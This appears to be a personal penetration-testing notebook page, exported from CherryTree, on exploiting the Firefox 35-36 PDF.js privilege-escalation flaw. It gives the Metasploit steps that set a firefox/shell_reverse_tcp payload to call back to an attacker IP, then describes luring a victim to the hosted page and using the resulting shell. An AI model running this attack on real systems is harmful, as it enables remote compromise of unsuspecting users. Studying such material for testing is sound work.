<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>firefox version 35-36 bug</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>firefox version 35-36 bug</h1><br /><br />Description:<br /> <a
      href="http://www.zerodayinitiative.com/advisories/ZDI-15-110/" target="_blank">http://www.zerodayinitiative.com/advisories/ZDI-15-110/</a><br />
    <a
      href="https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_pdfjs_privilege_escalation" target="_blank">https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_pdfjs_privilege_escalation</a><br /><br />This
    exploit can execute arbitrary code by abusing a flaw existing in the way Firefox handles documents loaded through
    the <code>resource: URL</code> .<br />A Metasploit module that use this exploit is
    “exploit/multi/browser/firefox_pdfjs_privilege_escalation” that in this case is used to exploits the Mozilla PDF.js
    PDF file viewer.<br />How we can see from the description this exploit works on Firefox versions 35-36 <br /><a
      href="https://ftp.mozilla.org/pub/firefox/releases/35.0/win32/en-US/" target="_blank">https://ftp.mozilla.org/pub/firefox/releases/35.0/win32/en-US/</a>
    here we can find the vulnerable version<br /><br /><br />
    <div class="codebox">
      <div class="codebox">
        service&nbsp;postgresql&nbsp;start<br />msfconsole<br />use&nbsp;exploit/multi/browser/firefox_pdfjs_privilege_escalation<br />show&nbsp;options<br />set&nbsp;SRVHOST&nbsp;&lt;AttackerIP&gt;<br />show&nbsp;payloads<br />set&nbsp;payload&nbsp;firefox/shell_reverse_tcp<br />show&nbsp;options<br />set&nbsp;LHOST&nbsp;&lt;AttackerIP&gt;<br />run
      </div>
    </div><br /><a href=""><img src="images/823-1.png" alt="images/823-1.png" /></a><br />Metasploit automatically
    starts a web server, which hosts a <span style="color:#ff8700;">web page containing the exploit itself</span>. Now
    we just need to lure the victim into opening the address<br /><br /><br />After that the user have been clicked on
    the link, a command shell is been opened in Metasploit in another session(session 2 in this case) <br />The shell
    obtained is a simple command prompt shell, whereby, we can run any command we desire (like &quot;systeminfo&quot;
    like we have done)<br />
    <div class="codebox">
      <div class="codebox">
        back&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#use&nbsp;after&nbsp;that&nbsp;we&nbsp;have&nbsp;obtained&nbsp;the&nbsp;session<br />sessions<br />sessions&nbsp;-i&nbsp;&lt;sessionID&gt;<br />....
      </div>
    </div><br /><a href=""><img src="images/823-2.png" alt="images/823-2.png" /></a>
  </div>
</body>

</html>